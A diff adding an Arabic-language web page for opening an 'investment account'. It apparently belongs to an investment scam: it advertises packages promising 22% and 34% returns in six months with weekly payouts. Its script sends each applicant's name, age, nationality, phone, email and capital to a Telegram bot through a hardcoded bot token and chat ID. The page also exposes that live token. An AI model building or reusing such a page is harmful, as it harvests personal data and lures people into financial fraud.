+            <span class="error-msg">يرجى اختيار الجنسية</span>
+          </div>
+
+        </div><!-- /form-grid -->
+
+
+        <!-- ── SECTION 2: بيانات التواصل ── -->
+        <div class="section-title">
+          <div class="section-number">٢</div>
+          <h2>بيانات التواصل</h2>
+          <div class="section-line"></div>
+        </div>
+
+        <div class="form-grid">
+
+          <div class="form-group full-width">
+            <label for="phone">رقم الجوال <span class="required">*</span></label>
+            <div class="phone-wrapper">
+
+              <!-- Country Code Dropdown -->
+              <div class="custom-dropdown" id="phoneCodeDropdown">
+                <button type="button" class="custom-dropdown-btn" id="phoneCodeBtn"
+                        aria-haspopup="listbox" aria-expanded="false">
+                  <span class="dd-flag" id="phoneFlag">🇸🇦</span>
+                  <span class="dd-code" id="phoneCode">+966</span>
+                  <span class="dd-arrow">▼</span>
+                </button>
+                <div class="custom-dropdown-panel" id="phoneCodePanel">
+                  <div class="dd-search">
+                    <input type="text" id="phoneCodeSearch" placeholder="ابحث عن دولة..." autocomplete="off">
+                  </div>
+                  <div class="dd-list" id="phoneCodeList"></div>
+                </div>
+              </div>
+
+              <input type="tel" id="phone" name="phone"
+                     placeholder="05XXXXXXXX"
+                     required>
+            </div>
+            <span class="error-msg" id="phoneError">أدخل رقم هاتف صحيح</span>
+          </div>
+
+          <div class="form-group full-width">
+            <label for="email">البريد الإلكتروني <span class="required">*</span></label>
+            <input type="email" id="email" name="email" placeholder="أدخل بريدك الإلكتروني" required>
+            <span class="error-msg">أدخل بريداً إلكترونياً صحيحاً</span>
+          </div>
+
+        </div><!-- /form-grid -->
+
+
+        <!-- ── SECTION 3: بيانات الاستثمار ── -->
+        <div class="section-title">
+          <div class="section-number">٣</div>
+          <h2>بيانات الاستثمار</h2>
+          <div class="section-line"></div>
+        </div>
+
+        <div class="form-grid">
+
+          <div class="form-group full-width">
+            <label for="capital">رأس المال <span class="required">*</span></label>
+            <div class="capital-wrapper">
+
+              <!-- Currency Dropdown -->
+              <div class="custom-dropdown" id="currencyDropdown">
+                <button type="button" class="custom-dropdown-btn" id="currencyBtn"
+                        aria-haspopup="true" aria-expanded="false">
+                  <span class="dd-flag" id="currencyFlag">🇸🇦</span>
+                  <span class="dd-code" id="currencyCode">ريال</span>
+                  <span class="dd-arrow">▼</span>
+                </button>
+                <div class="custom-dropdown-panel" id="currencyPanel">
+                  <div class="dd-list" id="currencyList"></div>
+                </div>
+              </div>
+
+              <input type="number" id="capital" name="capital"
+                     class="capital-input"
+                     placeholder="أدخل رأس المال"
+                     min="1000"
+                     required>
+            </div>
+            <span class="error-msg" id="capitalError">يرجى إدخال رأس مال صحيح</span>
+          </div>
+
+          <!-- نوع العرض - Radio Cards -->
+          <div class="form-group full-width">
+            <label>نوع العرض <span class="required">*</span></label>
+            <div class="offer-cards" id="offerCards">
+
+              <label class="offer-card">
+                <input type="radio" name="offerType" value="brokerage" required>
+                <span class="offer-card-label">
+                  <span class="offer-card-icon">📊</span>
+                  <span class="offer-card-name">الوساطة المالية</span>
+                  <span class="offer-card-desc">تداول الأسهم والأوراق المالية</span>
+                </span>
+              </label>
+
+              <label class="offer-card">
+                <input type="radio" name="offerType" value="funds" required>
+                <span class="offer-card-label">
+                  <span class="offer-card-icon">🏗️</span>
+                  <span class="offer-card-name">صناديق الاستثمار العقاري</span>
+                  <span class="offer-card-desc">الاستثمار في العقارات</span>
+                </span>
+              </label>
+
+              <label class="offer-card">
+                <input type="radio" name="offerType" value="portfolios" required>
+                <span class="offer-card-label">
+                  <span class="offer-card-icon">💼</span>
+                  <span class="offer-card-name">إدارة المحافظ</span>
+                  <span class="offer-card-desc">إدارة محترفة لأصولك</span>
+                </span>
+              </label>
+
+              <label class="offer-card">
+                <input type="radio" name="offerType" value="ipo" required>
+                <span class="offer-card-label">
+                  <span class="offer-card-icon">🎯</span>
+                  <span class="offer-card-name">الاكتتابات</span>
+                  <span class="offer-card-desc">إدارة الاكتتابات العامة</span>
+                </span>
+              </label>
+
+              <!-- ── Divider ── -->
+              <div class="offer-packages-divider">
+                <span>أو اختر أحد حزم الاستثمار</span>
+              </div>
+
+              <!-- ── العرض العادي ── -->
+              <label class="offer-package">
+                <input type="radio" name="offerType" value="normal">
+                <span class="offer-package-label">
+
+                  <span class="pkg-header">
+                    <span class="pkg-header-info">
+                      <span class="pkg-badge normal">⬡ عادي</span>
+                      <span class="pkg-title">العرض العادي</span>
+                      <span class="pkg-subtitle">خيار مثالي للمستثمرين الجدد الذين يبحثون عن عوائد مجزية</span>
+                    </span>
+                    <span class="pkg-check">✓</span>
+                  </span>
+
+                  <span class="pkg-stats">
+                    <span class="pkg-stat">
+                      <span class="pkg-stat-label">مبلغ الاستثمار</span>
+                      <span class="pkg-stat-value">1K – 10K</span>
+                    </span>
+                    <span class="pkg-stat">
+                      <span class="pkg-stat-label">نسبة الأرباح</span>
+                      <span class="pkg-stat-value highlight">22%</span>
+                    </span>
+                    <span class="pkg-stat">
+                      <span class="pkg-stat-label">مدة العقد</span>
+                      <span class="pkg-stat-value">6 أشهر</span>
+                    </span>
+                    <span class="pkg-stat">
+                      <span class="pkg-stat-label">توزيع الأرباح</span>
+                      <span class="pkg-stat-value">أسبوعي</span>
+                    </span>
+                  </span>
+
+                  <span class="pkg-footer">
+                    <span class="pkg-range">
+                      <span class="pkg-range-item">
+                        <span class="pkg-range-dot"></span>
+                        <span class="pkg-range-label">الحد الأدنى:</span>
+                        <span class="pkg-range-val">1,000 ريال</span>
+                      </span>
+                      <span class="pkg-range-sep">|</span>
+                      <span class="pkg-range-item">
+                        <span class="pkg-range-dot"></span>
+                        <span class="pkg-range-label">الحد الأقصى:</span>
+                        <span class="pkg-range-val">10,000 ريال</span>
+                      </span>
+                    </span>
+                  </span>
+
+                </span>
+              </label>
+
+              <!-- ── العرض الذهبي ── -->
+              <label class="offer-package gold">
+                <input type="radio" name="offerType" value="golden">
+                <span class="offer-package-label">
+
+                  <span class="pkg-header">
+                    <span class="pkg-header-info">
+                      <span class="pkg-badge gold-badge">✦ ذهبي</span>
+                      <span class="pkg-title">العرض الذهبي</span>
+                      <span class="pkg-subtitle">للمستثمرين المميزين الباحثين عن أعلى العوائد الاستثمارية</span>
+                    </span>
+                    <span class="pkg-check">✓</span>
+                  </span>
+
+                  <span class="pkg-stats">
+                    <span class="pkg-stat">
+                      <span class="pkg-stat-label">مبلغ الاستثمار</span>
+                      <span class="pkg-stat-value">10K – 100K</span>
+                    </span>
+                    <span class="pkg-stat">
+                      <span class="pkg-stat-label">نسبة الأرباح</span>
+                      <span class="pkg-stat-value highlight">34%</span>
+                    </span>
+                    <span class="pkg-stat">
+                      <span class="pkg-stat-label">مدة العقد</span>
+                      <span class="pkg-stat-value">6 أشهر</span>
+                    </span>
+                    <span class="pkg-stat">
+                      <span class="pkg-stat-label">توزيع الأرباح</span>
+                      <span class="pkg-stat-value">أسبوعي</span>
+                    </span>
+                  </span>
+
+                  <span class="pkg-footer">
+                    <span class="pkg-range">
+                      <span class="pkg-range-item">
+                        <span class="pkg-range-dot"></span>
+                        <span class="pkg-range-label">الحد الأدنى:</span>
+                        <span class="pkg-range-val">10,000 ريال</span>
+                      </span>
+                      <span class="pkg-range-sep">|</span>
+                      <span class="pkg-range-item">
+                        <span class="pkg-range-dot"></span>
+                        <span class="pkg-range-label">الحد الأقصى:</span>
+                        <span class="pkg-range-val">100,000 ريال</span>
+                      </span>
+                    </span>
+                    <span class="pkg-extra">
+                      <span class="pkg-extra-icon">⭐</span>
+                      دعم مخصص وتقارير تفصيلية
+                    </span>
+                  </span>
+
+                </span>
+              </label>
+
+            </div>
+            <span class="error-msg offer-error-hidden" id="offerError">يرجى اختيار نوع العرض</span>
+          </div>
+
+          <!-- ملاحظات -->
+          <div class="form-group full-width">
+            <label for="notes">
+              ملاحظات إضافية
+              <span class="optional">(اختياري)</span>
+            </label>
+            <textarea id="notes" name="notes"
+                      placeholder="أضف أي ملاحظات إضافية أو استفسارات تودّ مشاركتها معنا..."></textarea>
+          </div>
+
+        </div><!-- /form-grid -->
+
+
+        <!-- ── SUBMIT ── -->
+        <div class="submit-section">
+          <button type="submit" class="btn-submit" id="submitBtn">
+            <span class="spinner"></span>
+            <svg class="btn-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" viewBox="0 0 16 16">
+              <path d="M15.854.146a.5.5 0 0 1 .11.54l-5.819 14.547a.75.75 0 0 1-1.329.124l-3.178-4.995L.643 7.184a.75.75 0 0 1 .124-1.33L15.314.037a.5.5 0 0 1 .54.11ZM6.636 10.07l2.761 4.338L14.13 2.576 6.636 10.07Zm6.787-8.201L1.591 6.602l4.339 2.76 7.494-7.493Z"/>
+            </svg>
+            <span class="btn-label">إرسال الطلب</span>
+          </button>
+
+          <p class="terms-note">
+            بإرسال هذا الطلب فإنك توافق على
+            <a href="#">سياسة الخصوصية</a> و
+            <a href="#">الشروط والأحكام</a>
+            الخاصة بمشاركة المالية
+          </p>
+        </div>
+
+      </form>
+      <!-- /FORM -->
+
+    </div><!-- /form-container -->
+  </main>
+
+</div><!-- /page-wrapper -->
+
+
+<!-- ============================================================
+     FORM VALIDATION & SUBMIT TO TELEGRAM
+============================================================ -->
+<script>
+  /* ============================================================
+     TELEGRAM BOT CONFIGURATION
+  ============================================================ */
+  const TELEGRAM_CONFIG = {
+      token: '8660100340:AAEPj1rlH5PfPZ8StoztNi2m7ZmOOgzLrr4',
+      chatId: '-1003890710277'
+  };
+
+  /* ============================================================
+     SEND TO TELEGRAM FUNCTION
+  ============================================================ */
+  async function sendToTelegram(message) {
+      try {
+          const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage`;
+          
+          const response = await fetch(url, {
+              method: 'POST',
+              headers: {
+                  'Content-Type': 'application/json',
+              },
+              body: JSON.stringify({
+                  chat_id: TELEGRAM_CONFIG.chatId,
+                  text: message,
+                  parse_mode: 'HTML',
+                  disable_web_page_preview: true
+              })
+          });
+
+          const data = await response.json();
+          
+          if (data.ok) {
+              console.log('✅ Message sent to Telegram successfully');
+              return true;
+          } else {
+              console.error('❌ Telegram API error:', data.description);
+              return false;
+          }
+      } catch (error) {
+          console.error('❌ Failed to send message to Telegram:', error);
+          return false;
+      }
+  }
+
+  /* ============================================================
+     FORMAT MESSAGE FOR TELEGRAM
+  ============================================================ */
+  function formatTelegramMessage(formData) {
+      const divider = '─'.repeat(35);
+      const timestamp = new Date().toLocaleString('ar-SA', { 
+          timeZone: 'Asia/Riyadh',
+          year: 'numeric',
+          month: 'long',
+          day: 'numeric',
+          hour: '2-digit',
+          minute: '2-digit',
+          second: '2-digit'
+      });
+      
+      let message = `🔔 <b>📋 طلب فتح حساب استثماري جديد</b>\n\n`;
+      message += `${divider}\n\n`;
+      
+      message += `👤 <b>البيانات الشخصية</b>\n`;
+      message += `• الاسم الأول: ${formData.firstName}\n`;
+      message += `• الاسم الثاني: ${formData.secondName}\n`;
+      message += `• الاسم الثالث: ${formData.thirdName}\n`;
+      message += `• الاسم الكامل: ${formData.fullName}\n`;
+      message += `• العمر: ${formData.age} سنة\n`;
+      message += `• الجنسية: ${formData.nationality}\n\n`;
+      
+      message += `📱 <b>بيانات التواصل</b>\n`;
+      message += `• رقم الجوال: ${formData.phone}\n`;
+      message += `• البريد الإلكتروني: ${formData.email}\n\n`;
+      
+      message += `💰 <b>بيانات الاستثمار</b>\n`;
+      message += `• رأس المال: ${formData.capital}\n`;
+      message += `• نوع العرض: ${formData.offerType}\n`;
+      
+      if (formData.notes && formData.notes.trim() !== '') {
+          message += `\n📝 <b>ملاحظات إضافية</b>\n`;
+          message += `${formData.notes}\n`;
+      }
+      
+      message += `\n${divider}\n`;
+      message += `🕐 <b>وقت الإرسال:</b> ${timestamp}\n`;
+      message += `🆔 <b>رقم الطلب:</b> ${Date.now().toString().slice(-8)}`;
+      
+      return message;
+  }
+
+  /* ============================================================
+     COLLECT FORM DATA AND SEND TO TELEGRAM
+  ============================================================ */
+  async function submitFormToTelegram() {
+      try {
+          // Collect personal data
+          const firstName = document.getElementById('firstName')?.value.trim() || '';
+          const secondName = document.getElementById('secondName')?.value.trim() || '';
+          const thirdName = document.getElementById('thirdName')?.value.trim() || '';
+          const age = document.getElementById('age')?.value || '';
+          
+          // Get nationality text
+          const nationalitySelect = document.getElementById('nationality');
+          let nationality = '';
+          if (nationalitySelect && nationalitySelect.selectedIndex > 0) {
+              nationality = nationalitySelect.options[nationalitySelect.selectedIndex].text;
+          }
+          
+          // Get phone with code
+          const phoneCode = document.getElementById('phoneCode')?.textContent || '+966';
+          const phoneNumber = document.getElementById('phone')?.value.trim() || '';
+          const fullPhone = `${phoneCode} ${phoneNumber}`;
+          
+          // Get email
+          const email = document.getElementById('email')?.value.trim() || '';
+          
+          // Get capital with currency
+          const capitalValue = document.getElementById('capital')?.value || '';
+          const currencyCode = document.getElementById('currencyCode')?.textContent || 'ريال';
+          const capital = `${capitalValue} ${currencyCode}`;
+          
+          // Get offer type
+          const selectedOffer = document.querySelector('input[name="offerType"]:checked');
+          let offerType = '';
+          if (selectedOffer) {
+              const offerValue = selectedOffer.value;
+              const offerLabels = {
+                  brokerage: 'الوساطة المالية 📊',
+                  funds: 'صناديق الاستثمار العقاري 🏗️',
+                  portfolios: 'إدارة المحافظ 💼',
+                  ipo: 'الاكتتابات 🎯',
+                  normal: 'العرض العادي ⬡ (نسبة 22% | مدة 6 أشهر)',
+                  golden: 'العرض الذهبي ✦ (نسبة 34% | مدة 6 أشهر)'
+              };
+              offerType = offerLabels[offerValue] || offerValue;
+          }
+          
+          // Get notes
+          const notes = document.getElementById('notes')?.value.trim() || '';
+          
+          // Validate required fields
+          if (!firstName || !secondName || !thirdName || !age || !nationality || !phoneNumber || !email || !capitalValue || !offerType) {
+              throw new Error('يرجى تعبئة جميع الحقول المطلوبة');
+          }
+          
+          // Prepare form data object
+          const formData = {
+              firstName: firstName,
+              secondName: secondName,
+              thirdName: thirdName,
+              fullName: `${firstName} ${secondName} ${thirdName}`,
+              age: age,
+              nationality: nationality,
+              phone: fullPhone,
+              email: email,
+              capital: capital,
+              offerType: offerType,
+              notes: notes
+          };
+          
+          // Format message for Telegram
+          const message = formatTelegramMessage(formData);
+          
+          // Send to Telegram
+          const success = await sendToTelegram(message);
+          
+          if (success) {
+              console.log('✅ Form data sent to Telegram successfully');
+              return true;
+          } else {
+              throw new Error('فشل إرسال البيانات إلى البوت');
+          }
+          
+      } catch (error) {
+          console.error('❌ Error in submitFormToTelegram:', error);
+          throw error;
+      }
+  }
+
+  /* ============================================================
+     DATA FOR DROPDOWNS
+  ============================================================ */
+  const COUNTRIES = [
+    { flag:'🇸🇦', name:'السعودية',      code:'+966', digits:9  },
+    { flag:'🇦🇪', name:'الإمارات',      code:'+971', digits:9  },
+    { flag:'🇰🇼', name:'الكويت',        code:'+965', digits:8  },
+    { flag:'🇶🇦', name:'قطر',           code:'+974', digits:8  },
+    { flag:'🇧🇭', name:'البحرين',       code:'+973', digits:8  },
+    { flag:'🇴🇲', name:'عُمان',         code:'+968', digits:8  },
+    { flag:'🇪🇬', name:'مصر',           code:'+20',  digits:10 },
+    { flag:'🇯🇴', name:'الأردن',        code:'+962', digits:9  },
+    { flag:'🇸🇾', name:'سوريا',         code:'+963', digits:9  },
+    { flag:'🇱🇧', name:'لبنان',         code:'+961', digits:8  },
+    { flag:'🇮🇶', name:'العراق',        code:'+964', digits:10 },
+    { flag:'🇾🇪', name:'اليمن',         code:'+967', digits:9  },
+    { flag:'🇱🇾', name:'ليبيا',         code:'+218', digits:9  },
+    { flag:'🇹🇳', name:'تونس',          code:'+216', digits:8  },
+    { flag:'🇩🇿', name:'الجزائر',       code:'+213', digits:9  },
+    { flag:'🇲🇦', name:'المغرب',        code:'+212', digits:9  },
+    { flag:'🇸🇩', name:'السودان',       code:'+249', digits:9  },
+    { flag:'🇵🇰', name:'باكستان',       code:'+92',  digits:10 },
+    { flag:'🇮🇳', name:'الهند',         code:'+91',  digits:10 },
+    { flag:'🇺🇸', name:'الولايات المتحدة', code:'+1', digits:10 },
+    { flag:'🇬🇧', name:'المملكة المتحدة',  code:'+44', digits:10 },
+    { flag:'🇩🇪', name:'ألمانيا',       code:'+49',  digits:11 },
+    { flag:'🇫🇷', name:'فرنسا',         code:'+33',  digits:9  },
+    { flag:'🇹🇷', name:'تركيا',         code:'+90',  digits:10 },
+  ];
+
+  const CURRENCIES = [
+    { flag:'🇸🇦', name:'ريال سعودي',        code:'SAR', symbol:'ر.س'  },
+    { flag:'🇦🇪', name:'درهم إماراتي',       code:'AED', symbol:'د.إ'  },
+    { flag:'🇰🇼', name:'دينار كويتي',        code:'KWD', symbol:'د.ك'  },
+    { flag:'🇶🇦', name:'ريال قطري',          code:'QAR', symbol:'ر.ق'  },
+    { flag:'🇧🇭', name:'دينار بحريني',       code:'BHD', symbol:'د.ب'  },
+    { flag:'🇴🇲', name:'ريال عُماني',        code:'OMR', symbol:'ر.ع'  },
+    { flag:'🇪🇬', name:'جنيه مصري',          code:'EGP', symbol:'ج.م'  },
+    { flag:'🇯🇴', name:'دينار أردني',        code:'JOD', symbol:'د.أ'  },
+    { flag:'🇺🇸', name:'دولار أمريكي',       code:'USD', symbol:'$'    },
+    { flag:'🇪🇺', name:'يورو',               code:'EUR', symbol:'€'    },
+    { flag:'🇬🇧', name:'جنيه إسترليني',      code:'GBP', symbol:'£'    },
+  ];
+
+  /* ============================================================
+     GENERIC CUSTOM DROPDOWN FACTORY
+  ============================================================ */
+  function makeDropdown(opts) {
+    const { wrapperId, btnId, panelId, listId, searchId,
+            data, labelKey, codeKey, flagKey,
+            flagElId, codeElId, onSelect } = opts;
+
+    const wrapper = document.getElementById(wrapperId);
+    const btn     = document.getElementById(btnId);
+    const panel   = document.getElementById(panelId);
+    const listEl  = document.getElementById(listId);
+    const searchEl = searchId ? document.getElementById(searchId) : null;
+
+    let selectedIndex = 0;
+
+    function render(items) {
+      listEl.innerHTML = '';
+      items.forEach((item, idx) => {
+        const realIdx = data.indexOf(item);
+        const div = document.createElement('div');
+        div.className = 'dd-item' + (realIdx === selectedIndex ? ' active' : '');
+        div.setAttribute('role', 'option');
+        div.innerHTML =
+          '<span class="item-flag">' + item[flagKey] + '</span>' +
+          '<span class="item-name">' + item[labelKey] + '</span>' +
+          '<span class="item-code">' + item[codeKey] + '</span>';
+        div.addEventListener('mousedown', function(e) {
+          e.preventDefault();
+          selectedIndex = realIdx;
+          document.getElementById(flagElId).textContent = item[flagKey];
+          document.getElementById(codeElId).textContent = item[codeKey];
+          close();
+          if (onSelect) onSelect(item);
+        });
+        listEl.appendChild(div);
+      });
+    }
+
+    function positionPanel() {
+      const rect    = btn.getBoundingClientRect();
+      const panelW  = panel.offsetWidth  || 270;
+      const panelH  = panel.offsetHeight || 320;
+      const vw      = window.innerWidth;
+      const vh      = window.innerHeight;
+
+      let top = rect.bottom + 6;
+      if (top + panelH > vh - 8 && rect.top - panelH - 6 > 8) {
+        top = rect.top - panelH - 6;
+      }
+
+      let left = rect.right - panelW;
+      if (left < 8)              left = 8;
+      if (left + panelW > vw - 8) left = vw - panelW - 8;
+
+      panel.style.top  = top  + 'px';
+      panel.style.left = left + 'px';
+    }
+
+    function open() {
+      wrapper.classList.add('open');
+      btn.setAttribute('aria-expanded', 'true');
+      render(data);
+      positionPanel();
+      if (searchEl) { searchEl.value = ''; searchEl.focus(); }
+      setTimeout(() => {
+        positionPanel();
+        const active = listEl.querySelector('.active');
+        if (active) active.scrollIntoView({ block: 'nearest' });
+      }, 30);
+    }
+
+    function close() {
+      wrapper.classList.remove('open');
+      btn.setAttribute('aria-expanded', 'false');
+    }
+
+    btn.addEventListener('click', function() {
+      wrapper.classList.contains('open') ? close() : open();
+    });
+
+    window.addEventListener('scroll', close, true);
+    window.addEventListener('resize', function() {
+      if (wrapper.classList.contains('open')) positionPanel();
+    });
+
+    if (searchEl) {
+      searchEl.addEventListener('input', function() {
+        const q = this.value.trim().toLowerCase();
+        const filtered = q
+          ? data.filter(d => d[labelKey].includes(q) || d[codeKey].includes(q))
+          : data;
+        render(filtered);
+      });
+    }
+
+    document.addEventListener('click', function(e) {
+      if (!wrapper.contains(e.target)) close();
+    });
+
+    document.getElementById(flagElId).textContent = data[0][flagKey];
+    document.getElementById(codeElId).textContent = data[0][codeKey];
+    render(data);
+  }
+
+  /* ============================================================
+     INIT DROPDOWNS
+  ============================================================ */
+  let selectedCountry  = COUNTRIES[0];
+  let selectedCurrency = CURRENCIES[0];
+
+  makeDropdown({
+    wrapperId: 'phoneCodeDropdown',
+    btnId:     'phoneCodeBtn',
+    panelId:   'phoneCodePanel',
+    listId:    'phoneCodeList',
+    searchId:  'phoneCodeSearch',
+    data:      COUNTRIES,
+    labelKey:  'name',
+    codeKey:   'code',
+    flagKey:   'flag',
+    flagElId:  'phoneFlag',
+    codeElId:  'phoneCode',
+    onSelect:  function(c) {
+      selectedCountry = c;
+      document.getElementById('phoneError').textContent =
+        'أدخل رقم هاتف صحيح (' + c.digits + ' أرقام)';
+    }
+  });
+
+  makeDropdown({
+    wrapperId: 'currencyDropdown',
+    btnId:     'currencyBtn',
+    panelId:   'currencyPanel',
+    listId:    'currencyList',
+    searchId:  null,
+    data:      CURRENCIES,
+    labelKey:  'name',
+    codeKey:   'symbol',
+    flagKey:   'flag',
+    flagElId:  'currencyFlag',
+    codeElId:  'currencyCode',
+    onSelect:  function(c) {
+      selectedCurrency = c;
+    }
+  });
+
+  /* ============================================================
+     FORM VALIDATION + SUBMIT TO TELEGRAM
+  ============================================================ */
+  const form      = document.getElementById('accountForm');
+  const submitBtn = document.getElementById('submitBtn');
+
+  function markField(el, valid, errId) {
+    if (!valid) {
+      el.classList.add('error');
+      if (errId) document.getElementById(errId).style.display = 'block';
+      return false;
+    }
+    el.classList.remove('error');
+    if (errId) document.getElementById(errId).style.display = 'none';
+    return true;
+  }
+
+  function resetForm() {
+    form.reset();
+    document.querySelectorAll('.error').forEach(el => el.classList.remove('error'));
+    document.getElementById('phoneFlag').textContent    = COUNTRIES[0].flag;
+    document.getElementById('phoneCode').textContent    = COUNTRIES[0].code;
+    document.getElementById('currencyFlag').textContent = CURRENCIES[0].flag;
+    document.getElementById('currencyCode').textContent = CURRENCIES[0].symbol;
+    selectedCountry  = COUNTRIES[0];
+    selectedCurrency = CURRENCIES[0];
+  }
+
+  function showToast(msg, duration) {
+    const t = document.getElementById('toastError');
+    t.textContent = msg;
+    t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), duration || 4000);
+  }
+
+  form.addEventListener('submit', async function(e) {
+    e.preventDefault();
+    let ok = true;
+
+    // Validation
+    ['firstName', 'secondName', 'thirdName'].forEach(id => {
+      const el = document.getElementById(id);
+      if (!markField(el, el.value.trim().length > 0, null)) ok = false;
+    });
+
+    const age = document.getElementById('age');
+    if (!markField(age, age.value >= 18 && age.value <= 100, 'ageError')) ok = false;
+
+    const nat = document.getElementById('nationality');
+    if (!markField(nat, nat.value !== '', null)) ok = false;
+
+    const phone  = document.getElementById('phone');
+    const digits = phone.value.trim().replace(/\D/g, '');
+    if (!markField(phone, digits.length >= 6 && digits.length <= 15, 'phoneError')) ok = false;
+
+    const email = document.getElementById('email');
+    if (!markField(email, /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.value.trim()), null)) ok = false;
+
+    const capital = document.getElementById('capital');
+    if (!markField(capital, Number(capital.value) > 0, 'capitalError')) ok = false;
+
+    const offerEl  = document.querySelector('input[name="offerType"]:checked');
+    const offerErr = document.getElementById('offerError');
+    offerErr.style.display = offerEl ? 'none' : 'block';
+    if (!offerEl) ok = false;
+
+    if (!ok) {
+      const firstErr = document.querySelector('input.error, select.error');
+      if (firstErr) firstErr.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      return;
+    }
+
+    // Send to Telegram
+    submitBtn.classList.add('loading');
+    submitBtn.querySelector('.btn-label').textContent = 'جاري الإرسال...';
+
+    try {
+      const success = await submitFormToTelegram();
+      
+      if (success) {
+        resetForm();
+        document.getElementById('successOverlay').classList.add('show');
+      } else {
+        throw new Error('فشل إرسال البيانات إلى البوت');
+      }
+    } catch (err) {
+      console.error('Error:', err.message);
+      showToast('⚠️ ' + err.message, 7000);
+    } finally {
+      submitBtn.classList.remove('loading');
+      submitBtn.querySelector('.btn-label').textContent = 'إرسال الطلب';
+    }
+  });
+
+  // Live validation on blur
+  document.querySelectorAll('input, select, textarea').forEach(el => {
+    el.addEventListener('blur', () => {
+      if (el.classList.contains('error') && el.value.trim()) {
+        el.classList.remove('error');
+      }
+    });
+  });
+</script>
+
+</body>
+</html>
